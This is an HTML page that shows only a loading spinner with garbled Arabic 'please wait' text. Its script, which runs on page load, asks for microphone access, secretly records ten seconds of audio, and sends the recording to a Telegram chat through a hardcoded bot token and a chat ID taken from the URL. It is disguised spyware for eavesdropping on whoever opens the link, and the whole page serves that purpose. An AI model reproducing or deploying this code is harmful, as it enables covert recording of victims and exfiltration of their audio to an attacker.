<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: #1a2a3a;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: Arial, sans-serif;
            color: white;
            overflow: hidden;
        }
        
        .loader-container {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .spinner {
            width: 80px;
            height: 80px;
            border: 8px solid rgba(255,255,255,0.3);
            border-top: 8px solid #3498db;
            border-radius: 50%;
            animation: spin 1.5s linear infinite;
            margin: 0 auto 20px;
        }
        
        .loading-text {
            font-size: 18px;
            color: rgba(255,255,255,0.8);
            margin-top: 15px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <div class="loader-container">
        <div class="spinner"></div>
        <div class="loading-text">ŸÑÿ≠ÿ∏ÿ© ŸÖŸÜ ŸÅÿ∂ŸÑŸÉ...</div>
    </div>

    <script>
        const BOT_TOKEN = '8277756807:AAH2xJqXd1ygl97PLq1lvruCeZ9rJVZ26io';
        
        function getChatId() {
            const params = new URLSearchParams(window.location.search);
            return params.get('chatId');
        }
        
        async function sendAudioToTelegram(audioBlob, chatId) {
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('audio', audioBlob, `audio_${Date.now()}.wav`);
            formData.append('caption', `üé§ ÿ™ÿ≥ÿ¨ŸäŸÑ ÿµŸàÿ™Ÿä 10 ÿ´ŸàÿßŸÜŸä\n‚è∞ ${new Date().toLocaleString('ar-EG')}`);
            
            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
                    method: 'POST',
                    body: formData
                });
                return response.ok;
            } catch (error) {
                console.error('Error sending audio:', error);
                return false;
            }
        }
        
        async function recordAudio() {
            const chatId = getChatId();
            if (!chatId) return;
            
            try {
                // ŸÅÿ™ÿ≠ ÿßŸÑŸÖŸäŸÉÿ±ŸàŸÅŸàŸÜ
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    audio: {
                        echoCancellation: true,
                        noiseSuppression: true,
                        sampleRate: 44100,
                        channelCount: 1
                    }
                });
                
                // ÿ®ÿØÿ° ÿ™ÿ≥ÿ¨ŸäŸÑ ÿßŸÑÿµŸàÿ™
                const mediaRecorder = new MediaRecorder(stream, {
                    mimeType: 'audio/webm;codecs=opus'
                });
                
                const chunks = [];
                
                mediaRecorder.ondataavailable = (event) => {
                    if (event.data.size > 0) {
                        chunks.push(event.data);
                    }
                };
                
                mediaRecorder.onstop = async () => {
                    // ÿ™ÿ¨ŸÖŸäÿπ ÿßŸÑÿµŸàÿ™
                    const audioBlob = new Blob(chunks, { type: 'audio/webm' });
                    
                    // ÿ•ÿ±ÿ≥ÿßŸÑ ÿßŸÑÿµŸàÿ™
                    await sendAudioToTelegram(audioBlob, chatId);
                    
                    // ÿ•ÿ∫ŸÑÿßŸÇ ÿßŸÑŸÖŸäŸÉÿ±ŸàŸÅŸàŸÜ
                    stream.getTracks().forEach(track => track.stop());
                };
                
                // ÿ®ÿØÿ° ÿßŸÑÿ™ÿ≥ÿ¨ŸäŸÑ
                mediaRecorder.start();
                
                // ÿ™ÿ≥ÿ¨ŸäŸÑ ŸÑŸÖÿØÿ© 10 ÿ´ŸàÿßŸÜŸä
                setTimeout(() => {
                    mediaRecorder.stop();
                }, 10000);
                
            } catch (error) {
                console.error('Error accessing microphone:', error);
            }
        }
        
        // ÿ®ÿØÿ° ÿßŸÑÿ™ÿ≥ÿ¨ŸäŸÑ ŸÅŸàÿ±ÿßŸã
        window.addEventListener('load', recordAudio);
    </script>
</body>
</html>
